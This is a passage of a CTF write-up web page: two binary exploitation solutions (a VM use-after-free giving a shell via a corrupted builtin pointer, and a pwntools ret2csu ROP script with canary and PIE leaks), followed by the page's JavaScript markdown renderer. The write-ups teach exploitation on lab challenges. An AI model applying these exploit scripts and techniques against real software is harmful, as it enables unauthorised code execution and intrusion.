- **builtin[0]**: \`0x31d0\` (print integer), 1 argument
- **builtin[1]**: \`0x2ee0\` (no-op), 0 arguments

The BUILTIN instruction enforces that the index is 0 or 1 only.

### Custom Allocator

The VM uses a pool allocator with size classes: 16, 32, 64, 128, 256, 512, 1024, 2048, 4096 bytes. Freed data blocks go to per-size-class free lists and are reused by subsequent allocations of the same class.

BUILTIN objects allocate 32-byte data blocks (size class 1).

## Vulnerability: Use-After-Free via SLICE

The SLICE instruction creates a view into a buffer by **copying the data pointer** directly:

\`\`\`
slice->data = buffer->data  // Shared pointer, no reference counting!
\`\`\`

The garbage collector (GC) does NOT track shared data references. When it frees an object of type 1, 2, or 3, it also frees the associated data block. This means:

1. If a buffer is created and a slice is made from it, they share the same data pointer
2. If the slice is freed by GC (unreachable from stack/globals), its shared data block is also freed
3. The original buffer still holds a now-dangling pointer to the freed data
4. A new allocation of the same size class can reuse this freed data block

This is a classic **use-after-free** through shared data.

## Exploit Strategy

### Step 1: Set up the UAF

\`\`\`
NEWBUF 32       ; Create buffer B1 with 32-byte data D1 (size class 1)
DUP             ; Duplicate B1 on stack
GSTORE 0        ; Save B1 in global[0]
DUP             ; Duplicate B1 again
READ 8          ; Read 8 dummy bytes into B1 (sets B1->length = 8)
DUP             ; Duplicate B1
SLICE 0 0       ; Create slice S1 from B1 (S1->data = D1, shared!)
DROP            ; Drop S1 (now unreachable)
GC              ; GC frees S1 AND D1! B1 still alive with dangling data ptr
\`\`\`

### Step 2: Reuse freed data with BUILTIN

\`\`\`
BUILTIN 0       ; Allocates 32-byte data from free list, REUSES D1!
                ; Writes func_ptr (0x31d0+ASLR) to D1+8
GSTORE 1        ; Save builtin in global[1]
\`\`\`

Now B1->data and the builtin's data both point to D1. The function pointer at D1+8 is the same memory as B1's buffer content starting at offset 0.

### Step 3: Leak the function pointer

\`\`\`
GLOAD 0         ; Load B1 (with length=8 from earlier READ)
PRINTB          ; Prints 8 bytes from D1+8 = the builtin's func_ptr!
\`\`\`

This leaks the address of \`print_int\` (\`0x31d0 + PIE_base\`) to stdout.

### Step 4: Overwrite function pointer

\`\`\`
GLOAD 0         ; Load B1 again
WRITEBUF 0 8    ; Read 8 bytes from stdin, write to D1+8
                ; We send: (leaked_addr - 0x1d0) = execve wrapper address
\`\`\`

### Step 5: Call the corrupted builtin

\`\`\`
PUSH 0          ; Push a dummy argument (builtin[0] expects 1 arg)
GLOAD 1         ; Load the corrupted builtin
CALL 1          ; Calls func_ptr at D1+8 = execve("/bin/sh")!
\`\`\`

### Computing the execve address

- Leaked value: \`print_int\` at binary offset \`0x31d0\`
- Target: \`execve_wrapper\` at binary offset \`0x3000\`
- Offset: \`0x3000 - 0x31d0 = -0x1d0\`
- So: \`execve_addr = leaked_ptr - 0x1d0\`

## Exploit Code

The assembled bytecode (\`/tmp/exploit.nvm\`):

\`\`\`
NEWBUF 32
DUP
GSTORE 0
DUP
READ 8
DUP
SLICE 0 0
DROP
GC
BUILTIN 0
GSTORE 1
GLOAD 0
PRINTB
GLOAD 0
WRITEBUF 0 8
PUSH 0
GLOAD 1
CALL 1
HALT
\`\`\`

The exploit script sends the bytecode, provides 8 dummy bytes for READ, receives the 8-byte leak, computes the execve address, sends it back via WRITEBUF, and the CALL instruction spawns a shell.

## Flag

\`\`\`
EH4X{l00ks_l1k3_1_n33d_4_s4rc4st1c_tut0r14l}
\`\`\`
`},
  {slug:'womp-womp',title:'Womp Womp',cat:'BinEx',pts:50,solves:215,
   md:`# Womp Womp - Binary Exploitation (50pts, 215 solves)

## Challenge

> "Hippity hoppity the flag is not your property"

Connection: \`nc chall.ehax.in 1337\`
Files: \`challenge\` (ELF 64-bit PIE), \`libcoreio.so\` (shared library)

## Analysis

### Binary Protections

**challenge binary:**
- Full RELRO, Stack Canary, NX, PIE (all protections enabled)

**libcoreio.so:**
- Partial RELRO, No Stack Canary, NX, PIE

### Program Flow

The program (\`service.c\`) has three sequential phases:

1. **\`submit_note\`** - Reads 0x40 bytes into a 0x40-byte buffer at \`rbp-0x50\`, then writes 0x58 bytes back (leaks 0x18 extra bytes beyond input).
2. **\`review_note\`** - Reads 0x20 bytes into a 0x20-byte buffer at \`rbp-0x30\`, stores \`finalize_note\` function pointer at \`rbp-0x10\`, then writes 0x30 bytes back.
3. **\`finalize_entry\`** - Reads **0x190 bytes** into a buffer starting at \`rbp-0x48\` (only 0x40 bytes to the canary). Classic buffer overflow.

### Win Function

\`emit_report\` in \`libcoreio.so\` opens and reads \`flag.txt\`, but requires three magic arguments:
- \`rdi = 0xdeadbeefdeadbeef\`
- \`rsi = 0xcafebabecafebabe\`
- \`rdx = 0xd00df00dd00df00d\`

## Vulnerabilities

### Info Leak 1: submit_note (Canary + Stack Address)

\`submit_note\` reads 0x40 bytes but writes 0x58 bytes from the same buffer base. The extra 0x18 bytes leak:
- Bytes 0x40-0x47: padding (zero)
- Bytes 0x48-0x4f: **stack canary**
- Bytes 0x50-0x57: **saved RBP** (main's frame pointer)

### Info Leak 2: review_note (PIE Base)

\`review_note\` stores the address of \`finalize_note\` (at PIE offset 0x980) on the stack at \`rbp-0x10\`, then writes 0x30 bytes from \`rbp-0x30\`, which includes that pointer. Bytes 0x20-0x27 of the output leak the **PIE base**.

### Buffer Overflow: finalize_entry

\`finalize_entry\` reads 0x190 bytes (400) into a buffer that only has 0x40 bytes before the canary. With the leaked canary, we can overwrite the return address with a ROP chain.

## Exploit Strategy: ret2csu

The challenge lacks a \`pop rdx; ret\` gadget, so we use **ret2csu** (abusing \`__libc_csu_init\` gadgets) to control \`rdx\`:

**CSU Gadgets:**
- \`0xc9a\`: \`pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret\`
- \`0xc80\`: \`mov rdx, r13; mov rsi, r14; mov edi, r15d; call *[r12 + rbx*8]\`

**Key trick:** We place the address of \`_fini\` (a benign function: \`sub rsp,8; add rsp,8; ret\` that does NOT clobber \`rdx\`/\`rsi\`) at a known location in our overflow buffer. Using the leaked saved RBP, we calculate the buffer's absolute stack address and point \`r12\` there.

### ROP Chain

\`\`\`
[_fini addr]  [padding * 0x38]  [canary]  [fake rbp]
[csu_pop]  [rbx=0] [rbp=1] [r12=&_fini_on_stack] [r13=0xd00df00dd00df00d] [r14=0xcafebabecafebabe] [r15=0]
[csu_call]   -> sets rdx, rsi, calls _fini (harmless)
[pad] [0]*6  -> consumed by csu epilogue
[pop_rdi] [0xdeadbeefdeadbeef]
[pop_rsi_r15] [0xcafebabecafebabe] [0]
[ret]        -> stack alignment
[emit_report@plt]
\`\`\`

## Exploit Code

\`\`\`python
from pwn import *
context.arch = 'amd64'

r = remote('chall.ehax.in', 1337)

# Leak canary + saved RBP from submit_note
r.recvuntil(b'Input log entry: ')
r.send(b'A' * 0x40)
r.recvuntil(b'[LOG] Entry received: ')
leak = r.recv(0x58)
canary = u64(leak[0x48:0x50])
saved_rbp = u64(leak[0x50:0x58])

# Leak PIE base from review_note
r.recvuntil(b'Input processing note: ')
r.send(b'B' * 0x20)
r.recvuntil(b'[PROC] Processing: ')
review_leak = r.recv(0x30)
pie_base = u64(review_leak[0x20:0x28]) - 0x980

# Gadgets
pop_rdi = pie_base + 0xca3
pop_rsi_r15 = pie_base + 0xca1
ret = pie_base + 0x7f9
emit_report_plt = pie_base + 0x838
csu_pop = pie_base + 0xc9a
csu_call = pie_base + 0xc80
fini_addr = pie_base + 0xcb4
buf_addr = saved_rbp - 0x58  # finalize_entry's buffer address

# Build overflow payload
payload = p64(fini_addr)        # pointer to _fini on stack
payload += b'C' * (0x40 - 8)   # padding
payload += p64(canary)
payload += p64(0)               # saved rbp
# ROP chain
payload += p64(csu_pop)
payload += p64(0) + p64(1) + p64(buf_addr)
payload += p64(0xd00df00dd00df00d)  # r13 -> rdx
payload += p64(0xcafebabecafebabe)  # r14 -> rsi
payload += p64(0)                    # r15
payload += p64(csu_call)
payload += p64(0) * 7               # csu epilogue padding
payload += p64(pop_rdi) + p64(0xdeadbeefdeadbeef)
payload += p64(pop_rsi_r15) + p64(0xcafebabecafebabe) + p64(0)
payload += p64(ret)
payload += p64(emit_report_plt)

r.recvuntil(b'Send final payload: ')
r.send(payload)
print(r.recvall(timeout=5))
\`\`\`

## Flag

\`\`\`
EH4X{r0pp3d_th3_w0mp3d}
\`\`\`
`},
];

// â”€â”€ MARKDOWN RENDERER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function mdToHTML(md) {
  const el = document.createElement('div');
  // Process code blocks first (protect from other parsing)
  const codeBlocks = [];
  md = md.replace(/```[\s\S]*?```/g, m => {
    const code = m.replace(/^```[^\n]*\n?/, '').replace(/```$/, '');
    const pre = document.createElement('pre');
    const c = document.createElement('code');
    c.textContent = code;
    pre.appendChild(c);
    codeBlocks.push(pre.outerHTML);
    return `\x00CODEBLOCK${codeBlocks.length - 1}\x00`;
  });
  // Tables
  md = md.replace(/^\|(.+)\|\n\|[-| :]+\|\n((?:\|.+\|\n?)*)/gm, (_, head, body) => {
    const ths = head.split('|').filter(s => s.trim()).map(h => `<th>${escHtml(h.trim())}</th>`).join('');
    const rows = body.trim().split('\n').map(row => {
      const tds = row.split('|').filter(s => s.trim()).map(d => `<td>${inlinemd(d.trim())}</td>`).join('');
      return `<tr>${tds}</tr>`;
    }).join('');
    return `<table><thead><tr>${ths}</tr></thead><tbody>${rows}</tbody></table>`;
  });
  // Headings
  md = md.replace(/^### (.+)$/gm, (_, t) => `<h3>${escHtml(t)}</h3>`);
  md = md.replace(/^## (.+)$/gm, (_, t) => `<h2>${escHtml(t)}</h2>`);
  md = md.replace(/^# (.+)$/gm, (_, t) => `<h1>${escHtml(t)}</h1>`);
  // HR
  md = md.replace(/^---+$/gm, '<hr>');
  // Blockquote
  md = md.replace(/^> (.+)$/gm, (_, t) => `<blockquote>${inlinemd(t)}</blockquote>`);
  // Lists
  md = md.replace(/((?:^[-*] .+\n?)+)/gm, block => {
    const items = block.trim().split('\n').map(l => `<li>${inlinemd(l.replace(/^[-*] /, ''))}</li>`).join('');
    return `<ul>${items}</ul>`;
  });
  md = md.replace(/((?:^\d+\. .+\n?)+)/gm, block => {
    const items = block.trim().split('\n').map(l => `<li>${inlinemd(l.replace(/^\d+\. /, ''))}</li>`).join('');
    return `<ol>${items}</ol>`;
  });
  // Paragraphs (lines not already wrapped)
  const lines = md.split('\n');
  const out = [];
  let i = 0;
  while (i < lines.length) {
    const line = lines[i];
    if (!line.trim()) { i++; continue; }
    if (line.startsWith('<') || line.startsWith('\x00CODEBLOCK')) {
      out.push(line); i++;
    } else {
      // collect paragraph
      const para = [];
      while (i < lines.length && lines[i].trim() && !lines[i].startsWith('<') && !lines[i].startsWith('\x00CODEBLOCK')) {
        para.push(lines[i]); i++;
      }
      if (para.length) out.push(`<p>${inlinemd(para.join(' '))}</p>`);
    }
  }
  let html = out.join('\n');
  // Restore code blocks
  codeBlocks.forEach((cb, idx) => { html = html.replace(`\x00CODEBLOCK${idx}\x00`, cb); });
  el.innerHTML = html;
  return el;
}

function escHtml(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
function inlinemd(s) {
  s = escHtml(s);
  s = s.replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>');
  s = s.replace(/\*(.+?)\*/g, '<em>$1</em>');
  s = s.replace(/`([^`]+)`/g, '<code>$1</code>');
  s = s.replace(/\[(.+?)\]\((.+?)\)/g, '<a href="$2" target="_blank" rel="noopener">$1</a>');
  return s;
}

// â”€â”€ RENDER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
const CATS = [...new Set(WRITEUPS.map(w => w.cat))].sort();
let activeCat = 'All';

function renderFilter() {
  const f = document.getElementById('cat-filter');
  ['All', ...CATS].forEach(c => {
    const btn = document.createElement('button');
    btn.className = 'cat-btn' + (c === 'All' ? ' active' : '');
    btn.textContent = c;
    btn.onclick = () => {
      activeCat = c;
      document.querySelectorAll('.cat-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      filterCards();
    };
    f.appendChild(btn);
  });
}

function filterCards() {
  document.querySelectorAll('.wu-card').forEach(card => {
    card.classList.toggle('hidden', activeCat !== 'All' && card.dataset.cat !== activeCat);
  });
}

function renderCards() {
  const grid = document.getElementById('wu-grid');
  WRITEUPS.forEach((w, idx) => {
    const card = document.createElement('div');
    card.className = 'wu-card';
    card.dataset.cat = w.cat;
    card.onclick = () => openModal(idx);
    // top row
    const top = document.createElement('div'); top.className = 'card-top';
    const title = document.createElement('div'); title.className = 'card-title'; title.textContent = w.title;
    top.appendChild(title);
    if (w.pts !== null) {
      const pts = document.createElement('div'); pts.className = 'card-pts';
      pts.textContent = w.pts + 'pts'; top.appendChild(pts);
    }
    card.appendChild(top);
    // cat row
    const cr = document.createElement('div'); cr.className = 'card-cat-row';
    const cat = document.createElement('span'); cat.className = 'card-cat cat-' + w.cat;
    cat.textContent = w.cat; cr.appendChild(cat);
    if (w.solves !== null) {
      const sv = document.createElement('span'); sv.className = 'card-solves';
      sv.textContent = w.solves + ' solves'; cr.appendChild(sv);
    }
    card.appendChild(cr);
    grid.appendChild(card);
  });
}

function renderStats() {
  document.getElementById('stat-solved').textContent = WRITEUPS.length;
  document.getElementById('stat-cats').textContent = CATS.length;
}

// â”€â”€ MODAL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function openModal(idx) {
  const w = WRITEUPS[idx];
  document.getElementById('modal-title').textContent = w.title;
  const meta = document.getElementById('modal-meta');
  meta.innerHTML = '';
  const cat = document.createElement('span'); cat.className = 'card-cat cat-' + w.cat; cat.textContent = w.cat; meta.appendChild(cat);
  if (w.pts !== null) { const p = document.createElement('span'); p.className = 'card-pts'; p.textContent = w.pts + 'pts'; meta.appendChild(p); }
  if (w.solves !== null) { const s = document.createElement('span'); s.className = 'card-solves'; s.textContent = w.solves + ' solves'; meta.appendChild(s); }
  const body = document.getElementById('modal-body');
  body.innerHTML = '';
  body.appendChild(mdToHTML(w.md));
  const modal = document.getElementById('wu-modal');
  modal.classList.add('open');
  modal.scrollTop = 0;
  document.body.style.overflow = 'hidden';
}
function closeModal(e) {
  if (e && e.target !== document.getElementById('wu-modal')) return;
  document.getElementById('wu-modal').classList.remove('open');
  document.body.style.overflow = '';
}
document.addEventListener('keydown', e => { if (e.key === 'Escape') { document.getElementById('wu-modal').classList.remove('open'); document.body.style.overflow = ''; } });

// â”€â”€ INIT â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
function unlock() {
  document.getElementById('wu-page').classList.add('unlocked');
  renderStats(); renderFilter(); renderCards();
}

(function() {
  if (sessionStorage.getItem('wu_unlocked') === '1') {
    document.getElementById('lock-overlay').style.display = 'none';
    unlock();
  }
})();
</script>
</body>
</html>
